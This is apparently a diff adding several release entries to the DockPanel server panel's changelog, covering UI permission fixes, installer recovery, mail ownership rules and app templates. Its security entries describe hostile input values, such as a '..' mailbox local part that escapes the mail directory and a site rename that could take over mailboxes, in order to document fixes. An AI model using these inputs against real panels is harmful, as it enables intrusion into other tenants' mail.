+protected from the moment mail is installed. The map is always written and
+hashed *before* the restriction naming it is enabled, and if the hash fails the
+restriction is not armed at all — an unopenable lookup table would take SMTP
+off the air, so this fails towards delivery rather than towards silence.
+
+Upgrade note: on a fleet, agents receive this with their binary. Members only
+self-update when **Settings → agent auto-update** is on; otherwise run a fleet
+update.
+
+### Fixed — re-running a failed install left the panel unable to reach its database
+
+The PostgreSQL container is created early, with the password that run generated;
+`api.env` is not written until several steps later. An install that died in
+between — a single failed download is enough — left a container holding one
+password and no `api.env` at all. The next run found no `api.env`, generated a
+*new* password, found the container already present, started it unchanged, and
+wrote the new password. The panel then crash-looped for ever on
+`password authentication failed for user "dockpanel"`, and re-running never
+helped, because each run only minted another password the container had never
+heard of.
+
+The installer's own failure message says re-running is safe, so this was
+reachable by following the instructions after any transient network error. Found
+by hitting it on a fresh Ubuntu 24.04 box.
+
+The installer now checks that the database actually accepts the password it is
+about to write, and reconciles the role if it does not. A healthy install does
+no extra work. If the password cannot be recovered, it stops with the exact
+commands to fix it by hand rather than leaving a panel that will not start.
+
+## [2.105.0]
+
+### Fixed — six screens offered a client controls the server would refuse
+
+v2.103.0 gave site owners their own mail console. Driving the rest of the panel
+the same way found six more places where a non-administrator is shown a control,
+a tab or a link whose request can only come back refused — the same shape, on
+screens a client reaches by ordinary navigation.
+
+- **Monitoring → Alerts** showed all four of its tabs to everyone. Three of them
+  — Runbooks, On-call and Escalation policies — are administrator-only to the
+  last handler: 15 of the page's 19 requests are. A client clicking any of them
+  got an error banner over three lists that could never fill. The Alerts tab
+  itself is user-scoped and stays open, because those alerts are the client's own.
+- **Monitoring → Certificates** listed a client's own certificates correctly —
+  that read is deliberately open — and then offered **Renew** and **Delete**, the
+  only two controls on the page, both of which are administrator-only.
+- **A site's Backups page** offered a Destination picker that could never be
+  filled. This one was a severed pair rather than a missing gate: the endpoint
+  that *accepts* a destination for a site schedule takes any authenticated
+  caller, and says in its own comment that a site owner is meant to use it — but
+  the only route that could tell that caller which destinations exist was
+  administrator-only, and its refusal was swallowed into an empty list. So the
+  form said "No destinations yet" and linked to a page that bounces a client
+  straight back to the dashboard. There is now a caller-scoped route returning
+  id, name and type — and no credentials, which the struct cannot carry — and the
+  rule deciding which destinations a caller may use lives in **one** constant that
+  the reader and the writer both interpolate, so the set you are offered cannot
+  drift from the set that will be accepted.
+- **The Dashboard's Recommendations** resolved each row's link straight out of an
+  action map, and three of its six destinations are administrator-only. The
+  message stays — a client whose own site has no recent backup should be told —
+  but the link is now resolved through the same nav registry the sidebar and the
+  command palette use, so a row whose destination is not for this caller simply
+  is not a link.
+- **The Terminal's Share button** posts to an endpoint that requires an
+  administrator. Its neighbour, SSH Info, was already gated; Share was not. Copy
+  Output is deliberately left open — it never leaves the browser.
+- **Security, Users and Container Policies** each refused non-administrators
+  *after* registering their loaders. A redirect is itself an effect, so it does
+  not out-run them: the page fired its whole request burst — 11 to 12 of them on
+  Security — and collected a refusal for each before the redirect landed. Nothing
+  was disclosed, but every one was a refused request in the audit log. The guard
+  now sits above the first hook, where the other nineteen administrator pages
+  already put it.
+
+### Why these six were missed when the mail equivalent was fixed
+
+The sweep that followed the v2.103.0 fix enumerated administrator-gated handlers
+by searching for `AdminUser(`. Two route modules — the two behind the On-call and
+Escalation tabs — bind that extractor without destructuring it, so they never
+write that spelling and a search anchored on the open paren returns **zero** on
+both. Ten handlers were invisible to the count, and the surfaces in front of them
+stayed broken for two more releases.
+
+`client-surface-gating-pin-e2e.sh` (39 assertions) pins all six fixes, and its
+first section pins the cause: it detects any signature naming the extractor
+regardless of how it is written, then requires each one to match a known
+spelling. A fourth idiom makes it red rather than quietly shrinking the next
+census.
+
+## [2.104.0]
+
+### Fixed — the schema browser has not worked since March, and nothing said so
+
+Opening a table in **Databases → Schema Browser** listed no columns. It has
+behaved that way since `29d959b` (2026-03-23, v2.0.6), a commit titled *"Security
+hardening: fix 117 vulnerabilities across 45 files"* — and the hardening is what
+broke it.
+
+That commit rewrote the two column-listing statements to use bound placeholders
+(`?` and `$1`) and sent the values to the agent under a `"params"` key. The agent
+has never had a field to receive them: its request struct for `/databases/query`
+carries `sql` and nothing else, so serde discarded the key and the statement
+reached `mariadb -e` / `psql -c` with an unbound placeholder. Every column
+listing failed from that commit until this one.
+
+Three things kept it invisible for five months:
+
+- The caller discarded the rejection in a bare `catch {}`, so nothing was logged
+  and nothing was shown.
+- The columns pane and the **indexes** pane shared one all-or-nothing `Promise.all`,
+  so the index listing — whose endpoint was correct the whole time — was blanked
+  as collateral.
+- An empty pane looks the same as a table with nothing to report, so the failure
+  mode was indistinguishable from a boring result.
+
+The fix interpolates the already-validated table name, which is what the
+neighbouring `table_indexes` handler has always done — and it keeps the change
+backend-only, where a bind channel would have required the agent to ship in
+lockstep and would still have failed against any older agent.
+
+Two supporting changes came out of it. The two table-name validators have been
+replaced by **one**: they had drifted to different character sets, and the looser
+one guarded the statement that is interpolated — a validator diverging from the
+statement it protects is the shape of the original defect. And the two panes are
+now fetched independently and a failure is **shown**, so neither can silently
+blank the other again.
+
+New `db-schema-browser-pin-e2e.sh` (23 assertions) pins all of it, including a
+cross-tree arm asserting that every key the panel sends to `/databases/query` is
+a field the agent actually declares — the invariant `29d959b` broke. Before this
+release, no test referenced any `/databases` browser route.
+
+### Fixed — the Migration wizard promised to import email, and never could
+
+The wizard's header read *"Import sites, databases, and email"* while its own
+inventory section, further down the same screen, said email accounts must be
+recreated by hand. The header was wrong: there is no mail import route and no
+mail import function, and the import request carries only sites and databases.
+cPanel archives are parsed for mail accounts so the wizard can **list** them;
+Plesk and HestiaCP do not do even that. The header and the feature manifest now
+say what the code does.
+
+### Added — a database guide and a file-upload guide (GitHub #107)
+
+Neither existed, which made "there is nothing in the docs for this" a literally
+accurate report.
+
+- **Databases** — why a managed database is reachable from the server and nowhere
+  else, what each credential field is actually for, and why a containerised
+  database GUI cannot connect to one no matter what is typed into it. Also the
+  built-in SQL browser's real limits: 1000 rows, 15 seconds, a 5 MB output cap
+  that **fails** rather than truncating, and a query runner that is not read-only.
+- **Getting files onto a site** — the file manager's real ceiling is about
+  **1.5 MB per file**, not the 2 MB that gets quoted: uploads are base64-encoded
+  into a JSON body capped at 2 MiB, and base64 costs a third. Two larger limits
+  in the code (100 MB, 50 MB) are unreachable and should be ignored. Also the
+  document-root table, because copying a WordPress install to `/var/www/<domain>/`
+  instead of `/var/www/<domain>/public/` puts every file one level too high.
+
+### Changed — the credentials panel says what its fields can reach
+
+**Internal Host** now states that it is the Docker container's name, for
+`docker exec` and the CLI, and not a hostname anything can connect to. **Host**
+states that it works from a shell on the server and not from inside another
+container. The panel was handing out a value that cannot work and saying nothing
+when it did not.
+
+## [2.103.0]
+
+### Added — the mail console a site owner actually sees (GitHub #106, second half)
+
+v2.102.0 opened nine mail endpoints to the owner of the matching site and changed
+nothing in the panel, so the state it shipped was "live API, hidden UI": a client
+could call those endpoints with their own session and saw no way in. This release
+is the console in front of them.
+
+**The nav entry is unrestricted rather than newly flagged.** The obvious change —
+a "client-visible" flag — would have been wrong. `MAIL_DOMAIN_CALLER_PREDICATE`
+carries no role term: a `client`, a plain `user` and a `reseller` all reach a mail
+domain by the same route, whichever of them owns the site. The registry only ever
+sees a role string, and ownership is not knowable when the sidebar renders, so any
+single-role flag would contradict the API in one direction or the other. The row
+simply stops being `adminOnly`, which is what `/sites` and `/databases` already do.
+
+**The page is split by what the backend will answer, not by what looks tidy.**
+Mail.tsx is a host-level console — install, rspamd, webmail, relay, blacklist,
+rate limit, TLS, queue, logs, backups — and all of that stays with the
+administrator. A site owner gets their own domains, mailboxes, aliases and DNS
+records: the nine `AuthUser` endpoints, and nothing else.
+
+**Hiding the panels was not enough; the requests had to stop.** The mount effect
+fired nine requests, eight of them against admin-only handlers. Each `.catch`
+swallowed its 403 into an empty state — so a client would have been shown
+**"Mail Server Not Installed", with a button to `/settings`**, a page the nav
+deliberately hides from them, for a mail server that was running perfectly well.
+Those eight requests now sit behind the role test and are never made.
+
+The empty state says something a site owner can act on. "Add a mail domain to get
+started" is advice `create_domain` refuses; mail reaches them when an
+administrator adds a domain matching a site they already own, so it says that.
+
+Also removed a pre-existing hooks-order hazard: the admin redirect sat above forty
+`useState` calls, so the number of hooks the component rendered depended on
+whether the user had loaded yet.
+
+### Fixed
+
+- The Verify DNS button, the per-mailbox Backup button, the Add Domain and Delete
+  Domain controls and the Queue and Logs tabs are no longer offered to accounts
+  whose requests the backend refuses.
+
+### Testing
+
+- New `tests/mail-client-view-pin-e2e.sh`, 23 assertions. Every arm was checked
+  against the **widened** form of its subject rather than against deletion, and
+  the suite was mutation-tested end to end: 19 mutations, 19 killed. Two arms are
+  cross-tree — they read the extractors in `panel/backend/src/routes/mail.rs`, so
+  flipping a handler between `AuthUser` and `AdminUser` turns the frontend suite
+  red rather than letting the two copies of one rule drift apart.
+- Driven in a browser on an isolated scratch panel: a client's mail page makes
+  exactly four requests, all 200, where it previously made nine and eight were
+  refused.
+
+## [2.102.0]
+
+### Added — client-scoped mail: the owner of a site manages its mailboxes (GitHub #106)
+
+A mail domain is now reachable by the account that owns the site of the same name
+**on the same server**, not only by an administrator. Nine endpoints changed hands:
+the domain list, the DNS-record view, and full CRUD over mailboxes and aliases.
+`mail_domains` has no owner column, so ownership is answered through `sites` —
+which is why v2.101.0 had to make mail domains domain holders first.
+
+Two clauses do the safety work, and both are load-bearing:
+
+- **The site and the mail domain must be on the same server.** `sites` is unique
+  on `(domain, server_id)` and *not* on domain; so is `mail_domains`. Without the
+  server term, creating a mail domain on any machine in the fleet would hand every
+  mailbox on it to whoever held a site of that name on some *other* machine.
+  Consequence, stated rather than left to be discovered: **a domain whose website
+  and mailboxes live on different hosts stays administrator-only.**
+- **No other account may hold a case-variant of the name.** `mail_domains.domain`
+  has always been stored lowercase; `sites.domain` only since v2.52.0, so legacy
+  rows may hold mixed case. Folding one side alone would let two rows differing
+  only in case both match, so the entitlement additionally requires that the
+  caller is the *only* owner among case-variants. It fails closed on exactly the
+  legacy data that could otherwise widen it.
+
+A normalising migration was considered and **deliberately not written**: the unique
+index is on the raw column, so lowercasing in bulk raises a duplicate key on
+precisely the installs that have the problem — and a failed migration aborts panel
+startup. `sites.domain` is also the on-disk vhost key, which SQL cannot rename.
+
+Still administrator-only, and now asserted rather than merely intended: creating,
+updating and deleting a mail domain (`catch_all` is a mail-interception primitive),
+and the two DNS-verification endpoints.
+
+Creating a mail domain over a name a non-administrator already holds a site on is
+an entitlement-granting write. It is still allowed — it is how an operator gives a
+customer their mail — but it is no longer silent: the activity record now names the
+account that was granted.
+
+### Security — an empty or dotted mailbox local part was a path component and a map key
+
+The address validator tested the whole string for non-emptiness, never the local
+part, so `@example.com` and `..@example.com` were both accepted. Measured effects,
+each reproduced rather than reasoned about:
+
+- `@example.com` becomes a `virtual_mailbox_maps` key byte-identical to the
+  domain's catch-all key. The agent writes account lines before catch-all lines,
+  `postmap` keeps the first and reports the collision on a stderr the agent
+  discards — so creating that mailbox **silently voided the domain's catch-all**,
+  a setting only an administrator can write, and returned 201 with no warning.
+- `..@example.com` becomes the maildir `/var/vmail/{domain}/..`, which resolves one
+  level above the domain directory; the `chown -R` beside it then walked the whole
+  tree on every sync. The agent already refused a *domain* component containing
+  `..`; that guard had simply never been applied to the half of the path the local
+  part supplies.
+
+Both doors are administrator-only in 2.101.0 and open to a site owner in this
+release, which is why the fix ships with the entitlement rather than after it. One
+structural check now covers all five address doors — catch-all, mailbox address,
+forward, alias source and alias destination — and the agent refuses the same shapes
+independently, because the agent is what builds the path. Comma-separated alias
+destinations are checked per element: `root,user@example.com` was previously
+accepted whole.
+
+### Fixed — the guard on the mail claim had a test that could not fail
+
+`domain-claim-pin-e2e.sh` asserted that the mail gate "admits the administrator
+role and refuses everything else" by checking that the administrator comparison was
+*present*. The regression that matters does not remove that comparison, it adds one
+beside it — so opening the gate to clients left the string intact and the suite
+printed green. Measured: the whole corpus (59 suites, 338 unit tests) also failed to
+notice the administrator role term being deleted from the mail authorisation
+predicate outright. Both are now covered, and every arm was mutation-tested.
+
+## [2.101.0]
+
+### Security — a mail domain now holds its name, and only an administrator may claim over it
+
+`find_occupant` is the one place the panel answers "who already holds this
+domain?". It asked `sites`, `git_deploys`, `docker_stacks` and every agent's
+Docker-app labels. It never asked `mail_domains` — so a domain could be held by a
+mail domain and claimed by a site at the same time, which is exactly the
+two-owners state this module exists to prevent. It went unnoticed because the
+collision has no visible symptom: a mail-only domain has no vhost to overwrite.
+
+That gap becomes an escalation the moment mail is scoped to site ownership
+(GitHub #106), which is now being built. Scoping matches a mail domain's name
+against the domain of a site the caller owns — which makes `sites.domain` an
+authorisation key, and `sites.domain` is writable by the very account being
+authorised. `PUT /api/sites/{id}/domain` takes any authenticated owner, and the
+claim module deliberately permits a client to re-claim on behalf of a row it
+already holds. So a non-administrator could point a site they owned at a name
+whose mailboxes existed, and the match would then have handed them every mailbox
+and alias on it — including the power to replace each password hash.
+
+Mail domains are now registered as domain holders, and a claim onto one is
+refused for every non-administrator, by name:
+
+> Domain already in use by a mail domain. Ask an administrator to create the site
+> and transfer it to you — claiming a name whose mailboxes already exist would
+> hand you those mailboxes.
+
+- The refusal covers **every** non-administrator rather than only clients. A
+  plain `user` may create sites freely, so a client-only rule would have closed
+  the rename door and left the create door beside it open.
+- An **administrator is not refused**. A site and its mail sharing a name is an
+  ordinary arrangement and the arrangement the mail entitlement is built on, so
+  "set the mail up first, add the website after" keeps working.
+- The mail question is asked **last**, after every holder that must always
+  refuse, so the administrator tolerance can never mask a live vhost collision.
+- The rule **fails closed** — it admits the administrator role and refuses
+  anything else — where its sibling `may_claim_new` fails open. A role string
+  that drifts must never become able to take over a mailbox.
+
+No schema change. Verified end to end against a scratch panel: the rename is
+refused `409` for both a `client` and a plain `user`, an administrator passes,
+and a free domain passes. 9 new regression assertions.
+
+### Fixed — fourteen assertions about certificate pinning that ran nowhere
+
+`tests/tier2-pin-e2e.sh` proves that a server presenting the wrong certificate
+is refused: it captures a fingerprint on first checkin, accepts a matching one,
+rejects a mismatched one with `403`, rejects a malformed one with `400`, checks
+the pin survives both rejections, exercises the CSRF gate on rotation, and dials
+a pinned TLS connection to prove the client can still be *constructed* — the
+regression guard for v2.7.18, where a missing rustls `CryptoProvider` panicked
+while building the TLS config and answered `500` to a request the panel had not
+begun to process.
+
+**None of it had executed on any machine but its author's, since the suite
+landed.** It is a live suite — it needs a running API, a database and an admin
+row — but it was named `tier2-pin-e2e.sh`, which put it inside the
+`tests/*-pin-e2e.sh` glob that the CI sweep, the documentation census and every
+local "run all the pins" one-liner walk. It could not pass there, so it was
+excluded by name from each of them; and those exclusions were then the whole of
+its CI story, because nothing else ran it either. Worse, on a developer box the
+local sweep *did* run it — against the live panel database.
+
+The name was the trap, so the name is the fix:
+
+- Renamed to **`tests/tier2-certpin-e2e.sh`**, which the source-pin glob does not
+  match. That single change removes it from all three carve-outs at once and
+  stops the local pin sweep from writing to a live database.
+- New CI job **`tier2-certpin`** brings up a `postgres:16` service, builds the
+  API, boots it, creates the admin through the panel's own `/api/auth/setup`
+  endpoint, and runs the suite. This is the repository's first service container.
+  Like `nginx-contract` and `update-rollback`, it runs on pushes to `main` and on
+  pull requests; only the shared `regression-pins` workflow gates a release.
+- The suite reaches its database through `DOCKPANEL_TEST_DB_CONTAINER` instead of
+  a hardcoded container name. The default is unchanged.
+- It now says which of those two things failed. Every database error was
+  swallowed, so a wrong container name reported `Admin user row not found` and
+  sent whoever was fixing it to the users table.
+- Removed a dead `skip()` helper and two comments describing a skip path that
+  does not exist; all fourteen assertions have always run in both auth modes.
+
+### Added — a test that runs nowhere is a test that cannot fail
+
+`ship-gate-pin-e2e.sh` §S4 (4 assertions). The suite already pins that a red pin
+can stop a release; this is the quieter half of the same failure. Every file in
+`tests/` must now be run by the shared sweep, named in a workflow, or listed as
+exempt with the reason it needs a provisioned box — and an exemption that names a
+deleted file, or one that is already covered, fails too, so the list cannot decay
+into a fudge factor. Against the tree before this change, it names
+`tier2-pin-e2e.sh`.
+
+## [2.100.0]
+
+### Fixed — the panel told you your agent had broken, for twelve things you could fix yourself
+
+The panel deliberately hides agent faults behind an incident reference: any
+non-4xx answer from an agent has its body replaced with `Operation failed.
+Reference: <uuid>`, so an internal failure cannot leak internals. A 4xx is
+treated as an *answer* and passed through with its sentence intact.
+
+That rule is right. The bug is what happens when an agent answers 5xx for
+something that is not a fault at all — a missing package, a name already taken,
+a file above the editor's size cap. The reason is destroyed on the way out, and
+the operator is told their agent is broken while it is working perfectly.
+
+v2.99.0 fixed exactly one instance of this and wrote the rule down in its own
+comment. This release fixes the rest of the family, found by sweeping for it:
+
+- **Scheduled backups.** The nightly upload answered `500` for every SFTP
+  failure, including the missing-`sshpass` case whose whole purpose is to name
+  the remedy — fifteen lines above the handler v2.99.0 corrected. This is the
+  path where it mattered most: nobody is watching at 03:00, so the incident
+  reference *is* the entire message.
+- **Testing a backup destination created in the panel.** Destinations created
+  through the UI carry no server, so they are tested from the whole fleet — and
+  that summary flattened every member's answer into a gateway error. When every
+  host refuses for the same reason you can act on, you now get that reason.
+- **The file manager.** Opening a binary file or one over the 2 MB cap, creating
+  a folder whose name is taken, renaming onto an existing file, or deleting
+  something already gone — all six answered `502` with an incident id. They now
+  answer `404`, `409`, `413` and `415` with the sentence that explains them.
+- **Restores.** `restic` restore never checked that restic was installed, though
+  its own sibling in the same file has done so for months — so a rebuilt host
+  whose repository survived but whose package did not was told its agent was
+  broken *during a recovery*. It now refuses up front, and says so when there is
+  no repository to restore from. Restoring a volume archive the panel listed but
+  the host no longer has now answers `404` instead of minting a fresh incident
+  id on every retry.
+- **Staging sync and push.** Both directions run through one endpoint whose
+  refusals already spelled out the full path they could not find. That sentence
+  was being thrown away.
+- **The firewall page, on every RHEL-family server.** The rule list is read from
+  firewalld, so every row has a working delete button — backed by `ufw`, which
+  the panel will never install there. Add, delete and apply-fix all answered
+  `502`. Each handler had been sorting its errors with its own substring test,
+  so the package refusal matched neither; they now share one classifier keyed on
+  a named constant.
+- **Test Email.** A host without `msmtp` reported a spawn failure as `500`, so
+  operators concluded their credentials or their relay were wrong. The installer
+  is `apt-get`-only, which means this is permanent on the RHEL family — the new
+  message says exactly that instead of implicating the mail provider.
+
+### Fixed — two stale licence claims from one commit
+
+DockPanel has been AGPL-3.0 since the relicense. That commit updated five
+manifests and stopped: `website/server/package.json` still declared `ISC`, and
+`COMPARISON.md` still told readers the project was MIT. Both corrected, and both
+now pinned — nothing had ever checked a licence claim, which is why one commit
+could leave two behind.
+
+### Added
+
+- `agent-refusal-status-pin-e2e.sh` (38 assertions) pins each fixed path from
+  **both** ends: that the route classifies the refusal, and that the service
+  still raises the constant the route matches. A route matching a sentence
+  nothing produces is a test that cannot fail.
+- `docs-claims-pin-e2e.sh` grew a licence section: `LICENSE` is the AGPL text,
+  every first-party manifest is enumerated from disk and must declare
+  `AGPL-3.0-only`, and no reader-facing table may claim MIT for DockPanel.
+
+## [2.99.1]
+
+### Fixed — v2.99.0 published 19 assets and told you all of them were signed
+
+v2.98.0 attached 33 assets. v2.99.0 attached **19**: eleven artefacts, of which
+only four carried a Sigstore `.sig`/`.pem` pair. `checksums.txt` and the two agent
+binaries are signed; the API binaries, the CLI binaries, two SBOMs and the
+frontend archive are not.
+
+The cause is in the signing loop. `cosign sign-blob` was called without an
+explicit identity, so it detected an ambient one — and on the fifth artefact that
+detection missed and cosign fell back to **interactive browser device flow**,
+printing a verification code on a headless runner where no browser will ever
+arrive. The loop stopped there. The step is deliberately `continue-on-error` so a
+Sigstore outage cannot cost the publish, which meant the failure was swallowed and
+the step reported success.
+
+That trade-off is still right and is unchanged. What was wrong is that the release
+body went on asserting *"the `.sig`/`.pem` pairs are attached below"* over seven
+artefacts where they were not.
+
+Three changes: signing now supplies an explicit identity token refreshed per
+asset, so there is no interactive path to fall back to and a token failure costs
+one asset rather than every asset after it; a signature that does not complete has
+its partial pair deleted rather than left to be counted as coverage; and the
+release body is now reconciled against what was actually produced, before the
+release is created — if not everything is signed, it says how many are, and if
+nothing is, it says that.
+
+**v2.99.0's binaries are sound** — they are the same artefacts CI built and
+`checksums.txt` covers all of them and is itself signed. Only the signature
+coverage, and the claim about it, were wrong.
+
+## [2.99.0]
+
+### Added — the panel installs `sshpass` on a server that is already running
+
+Password-authenticated SFTP backup destinations shell out to `sshpass`. Fresh
+installs and servers added through the agent installer get it automatically, but
+a box that was already running when that landed never did — `update.sh` upgrades
+binaries and installs no packages. The only remedy was to tell the operator to
+run a package manager by hand, and issue #93 was left open on our own commitment
+not to leave it that way.
+
+Settings now lists `sshpass` alongside the other optional components, reports
+whether it is present, and installs it onto the selected server with the install
+log streamed, the same way Fail2Ban or Redis are installed.
+
+The install is bound to a server the caller is proven to own rather than to a
+server id supplied in the request: it runs a package transaction as root, and the
+fleet resolver behind the alternative carries no ownership predicate at all.
+
+### Fixed — the reason a password SFTP destination failed never reached anyone
+
+When `sshpass` was absent the agent produced a sentence naming the binary and the
+remedy. It answered with a **502**, and the panel deliberately replaces the body
+of any agent 5xx with an incident reference — that arm exists so an agent fault
+does not leak internals. So the operator was shown `Operation failed. Reference:
+<uuid>`, which says their agent broke, when the agent was working perfectly and
+the box was simply missing a package.
+
+A missing prerequisite is now answered as a **424**, so the sentence survives the
+trip. Every other SFTP failure is still a gateway error. The guidance that told
+operators to run `apt-get install sshpass` by hand is gone, and so is its claim
+that Test Connection already named the problem — it did not.
+
+## [2.98.0]
+
+### Fixed — the two light themes could not carry their own text
+
+The panel ships six chrome themes. The two light ones are a retrofit: the
+neutral ramp was inverted so a single card class works in all six, but the brand
+and interactive ramps were left running light-to-dark. On a white ground that
+made the dominant ink unreadable. `text-rust-400` measured **1.86:1** across 319
+call sites and `text-accent-400` **2.14:1** across 111 — against a 4.5:1 floor.
+
+It survived for months because only one of the two light themes had been given a
+second pass, and that pass was ~100 substring `!important` overrides repainting
+broken markup rather than fixing the tokens underneath. Reviewing new UI on that
+theme was a false pass; the other one was the honest test and nobody used it.
+
+Both ramps are now inks. The 300 step is deliberately **darker** than the 400 in
+the light themes: 42 of its 50 uses are the hover partner of the 400 step, and on
+a light ground a hover must darken. Every hover now moves by 1.21–1.35:1 instead
+of the 1.15:1 a conventional ramp would have forced.
+
+### Fixed — the primary button failed AA in half the themes
+
+`bg-rust-500` with `text-white` occurs at 187 sites. White on it measured 3.30:1
+on Terminal and 3.74:1 on Arctic. Both fills are darkened. Ember keeps its
+signature `#ea580c` — no orange clears 4.5:1 against white above L\* 49.6, an
+exhaustive sRGB scan — and takes **dark ink at 5.41:1** instead, via a compound
+class selector that cannot match the 191 tinted chips.
+
+### Fixed — 168 hover states changed nothing at all
+
+`--color-rust-600` was byte-identical to `--color-rust-500` in three themes, and
+a fourth had 600 and 700 identical, so `hover:bg-rust-600` and `hover:bg-rust-700`
+were visual no-ops for half the fleet.
+
+### Fixed — five token steps were consumed and defined nowhere
+
+`danger-300` (18 uses), `warn-300` (4), `dark-750` (3), `dark-850` (1) and
+`danger-700` (1) emitted no CSS at all: the severity map printed CRITICAL in plain
+body text while MAJOR printed red. The hover steps are now defined per theme; the
+neutral pair and the severity-inverting `warn-300` were resolved at the call site.
+
+### Fixed — the destructive confirm button lightened on hover
+
+22 `bg-danger-500 text-white` buttons hovered to `danger-400`, which measures
+3.80:1 with white text in **every** theme. They now darken to `danger-600` (7.69:1).
+
+### Fixed — 112 stock-Tailwind colours were frozen outside the theme system
+
+All 112 were in `pages/`; `components/` was already 100% token-clean. No theme
+rule remapped any of them, so they rendered emerald-green inside the orange theme
+and the navy one. All 112 are now tokens.
+
+### Fixed — an attribute with four writers and no reader
+
+`data-color-scheme` was written on every theme change and read by nothing, so the
+UA painted autofill, date pickers, native selects, checkboxes and Firefox
+scrollbars light-scheme on the four dark themes. Two CSS declarations.
+
+### Fixed — a public page announced errors at 2.77:1
+
+`PublicStatusPage` rendered its subscribe error in stock red on a `role="alert"`.
+
+### Fixed — form borders never reached the non-text floor
+
+The resting border on inputs, selects and textareas measured 2.56–2.82:1 against
+the field in four of six themes, under the 3.0 floor. `.markdown-body`, live on
+the monitoring page, hardcoded white-on-dark literals that composited to 1.09:1
+on a light ground.
+
+### Added — `theme-contrast-pin-e2e.sh`, 27 assertions
+
+The suite parses the real token blocks out of the stylesheet and computes WCAG
+relative luminance in awk, then asserts the **role** constraints rather than any
+hex: ink clears 4.5 on its own surface, a control boundary clears 3.0, a hover
+step is a different colour from the step it hovers, and every consumed token is
+defined in every theme. Any palette satisfying those passes. All nine sections
+were mutation-tested by planting the original defect and confirming a red run.
+
+## [2.97.0]
+
+### Fixed — thirty-one one-click apps could not write the volume the panel mounted for them
+
+Deploying an app template creates each declared volume as a directory owned by
+`root`, mode 0755, and bind-mounts it into the container. Nothing chowned it.
+
+That is correct for most images. They start as root and chown their own data
+directory in their entrypoint before dropping privileges — `postgres`, `mysql`
+and `mongo` all do exactly that. It is wrong for an image that declares a
+non-root user of its own, because that process starts **already dropped** and can
+never chown its way out. It cannot write the directory it was just given.
+
+The scale was measured rather than estimated, by reading every catalogue image's
+configuration straight from its registry: **42 of 148 images run as a non-root
+user, and 31 of those declare a volume** — 21% of the catalogue could not persist
+a byte. Among them Grafana, Jenkins, Prometheus, Mattermost, Rocket.Chat,
+SonarQube, Nexus, Node-RED, Directus, Superset, code-server, pgAdmin, Graylog and
+Wiki.js.
+
+Both ways it failed were bad, and the quiet one was worse. Prometheus, given the
+directory the panel used to create, exited with
+`open /prometheus/queries.active: permission denied` and left **zero files**
+behind; given a writable one it starts and writes its write-ahead log and lock
+immediately. SurrealDB was the other shape — it answered HTTP perfectly well
+while writing nothing at all, so the data was gone on restart.
+
+The fix reads the image's own declared user after the pull and chowns each volume
+directory to it. That user is frequently a **name** rather than a number — 24 of
+the 31 name a user — and a name means nothing on the host: it is defined by the
+image's own `/etc/passwd`. So the agent reads that file out of the image itself,
+by creating a container and copying the file out without ever starting it.
+
+The two cheaper fixes were both refused deliberately. `0777` would put a
+world-writable data directory on a host that runs other people's containers, and
+guessing a uid hands one tenant's data to a different account. When the name
+cannot be resolved the directory is left as it was and the agent says so in the
+log — the same state as before, but no longer a silent one. The chown happens
+only after the existing path-canonicalisation check, never before it, and never
+recursively.
+
+### Fixed — a nineteenth template pinned an image that cannot be pulled
+
+Readarr has been withdrawn. Its image publishes an index containing **zero
+manifests** on both of its tags, so `docker pull` fails outright, and the upstream
+project has been archived since June 2025 — there is nothing to repoint it to.
+
+This one survived the v2.96.0 sweep for a structural reason worth recording: that
+sweep classified references by the error *message* the registry returned, and this
+failure returns no error at all. The request succeeds with `200` and a
+well-formed index that simply happens to be empty. Any future check has to assert
+the index is non-empty rather than that the request worked. The catalogue is now
+148 templates, updated across every published surface.
+
+## [2.96.0]
+
+### Fixed — eighteen app templates could not be deployed at all, because their image reference did not resolve
+
+Issue #103. A template is a static image reference, so nothing in a build or a
+test could see this: the failure happened at `docker pull`, on a stranger's
+machine, every time. Eighteen of the 153 catalogue entries never got that far.
+
+Fifteen pinned a **tag the publisher does not publish**, and the shape was always
+the same — a bare major-version shorthand (`:1`, `:2`, `:11`, `:26`) assumed to be
+a convention these publishers simply do not use. Grafana publishes `13.1` and
+never `11`; Keycloak publishes `26.7` and never `26`; Rocket.Chat has 7,814 tags
+and not one bare major among them. Two more pinned a **repository that no longer
+exists** (`strapi/strapi` was deleted outright; the ghcr package
+`abetlen/stable-diffusion-webui` is gone). One pinned a **product line
+discontinued in 2020**.
+
+Every reference was probed against its registry and classified by the error
+*message*, never by an exit code — `manifest unknown` means the tag is absent,
+while a Docker Hub `401` means the repository does not exist anonymously (proven
+against a fabricated control repository that returns the identical `401`), and a
+`429` rate-limit is inconclusive and was re-run rather than recorded as a
+negative. v2.95.2 reported five of these and listed eight more as "UNKNOWN — the
+sweep was rate-limited". Re-run authenticated, **all eight were dead**, plus two
+nobody had flagged.
+
+Fourteen now pin a reference proven to resolve: `mailpit v1.30`, `cal.com
+v6.2.0`, `chatwoot latest-ce`, `code-server 4.131.0`, `garage v2.3.0`,
+`grafana 13.1`, `mattermost release-11`, `metabase v0.58-lts`, `outline 1.9`,
+`portainer lts`, `vaultwarden 1.37.1`, `keycloak 26.7`, `woodpecker v3` and
+`rocket.chat 8.7.0`. Because the old references could never be pulled, no
+existing deployment can be disturbed by the change — there was nothing to disturb.
+
+**Four templates were withdrawn rather than repointed**: Discourse, Zabbix,
+Strapi and Stable Diffusion WebUI. For each, the only pullable candidate was a
+frozen vendor archive that no longer receives security patches, a personal
+account's rebuild, or an amd64-only image — and DockPanel publishes an arm64
+build. Shipping one of those as a one-click default is worse than not offering
+the app. The catalogue is now 149 templates, and every count claim on ten
+published surfaces was updated with it.
+
+### Fixed — four more templates started a container that immediately exited
+
+The #101 class: the image's own default command does not start a service, so the
+container printed something and stopped on every deploy. Each command below was
+established by **running the image** and observing both directions — without it
+the container exits, with it the container stays up and answers on its port —
+rather than copied from documentation:
+
+- **Cloudflare Tunnel** — the starkest case. Its default `Cmd` is literally
+  `["version"]`, so every deploy printed a version string and exited, while the
+  template collected a required tunnel token it had no way to use. It now runs
+  `tunnel run`, which reads `TUNNEL_TOKEN` from the environment the template
+  already collects; the token never has to reach the command line.
+- **ntfy** — `serve`. Verified serving with the empty volume mounts a real deploy
+  creates, not just bare.
+- **Trivy Server** — `server --listen 0.0.0.0:8080`, answering `/healthz` once its
+  vulnerability database finishes downloading.
+- **Keycloak** — `start-dev`, which the template's own description had asked for
+  since before the struct could express it.
+
+**Three templates were deliberately left without a command**, because adding one
+would be worse than the defect it appears to cure. Authentik needs PostgreSQL and
